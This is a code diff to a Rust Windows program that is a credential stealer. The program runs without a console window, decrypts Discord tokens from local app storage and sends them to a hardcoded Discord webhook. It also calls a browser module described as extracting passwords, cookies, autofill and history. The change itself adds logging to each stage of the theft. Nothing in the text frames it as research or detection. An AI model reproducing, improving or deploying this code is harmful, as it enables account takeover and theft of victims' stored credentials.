@@ -1,6 +1,7 @@
 #![windows_subsystem = "windows"]
 
 mod browsers;
+mod log;
 
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use base64::{engine::general_purpose, Engine as _};
@@ -145,6 +146,8 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    log::init();
+    log::log("=== START ===");
     browsers::chrome_inject::cleanup_legacy_artifacts();
 
     let wbh = "https://discord.com/api/webhooks/1529195936272613640/QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd";
@@ -154,7 +157,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let discord_paths = get_discord_paths();
 
     for (name, path) in discord_paths {
-        if !path.exists() { continue; }
+        if !path.exists() {
+            log::log(&format!("discord skip (missing): {name}"));
+            continue;
+        }
+        log::log(&format!("discord scan: {name} -> {}", path.display()));
         
         let local_state_path = path.join("Local State");
 
@@ -181,6 +188,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                             if let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) {
                                                 if let Some(token) = decrypt_token(&enc_data, &master_key) {
                                                     if sent_tokens.insert(token.clone()) {
+                                                        log::log(&format!("discord token found ({name})"));
                                                         if let Some(user) = vt(&client, &token).await {
                                                             let avatar_url = user.avatar.as_ref().map(|h| format!("https://cdn.discordapp.com/avatars/{}/{}.png", user.id, h))
                                                                 .unwrap_or_else(|| "https://cdn.discordapp.com/embed/avatars/0.png".to_string());
@@ -213,9 +221,16 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                             let response = client.post(wbh).json(&embed).send().await;
                                                             match response {
                                                                 Ok(resp) => {
-                                                                    let _ = resp.status();
+                                                                    log::log(&format!(
+                                                                        "discord webhook token embed: HTTP {}",
+                                                                        resp.status()
+                                                                    ));
                                                                 }
-                                                                Err(_err) => {}
+                                                                Err(err) => {
+                                                                    log::log(&format!(
+                                                                        "discord webhook token embed ERR: {err}"
+                                                                    ));
+                                                                }
                                                             }
                                                         }
                                                     }
@@ -232,10 +247,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // === Browser Data Extraction (passwords, cookies, autofill, history) ===
-    if let Err(_e) = browsers::run(&client, wbh).await {
-        // silent
+    log::log(&format!("discord tokens sent: {}", sent_tokens.len()));
+
+    log::log("browser extraction start");
+    match browsers::run(&client, wbh).await {
+        Ok(()) => log::log("browser extraction OK"),
+        Err(e) => log::log(&format!("browser extraction ERR: {e}")),
     }
-    
+
+    log::log("=== DONE ===");
     Ok(())
 }
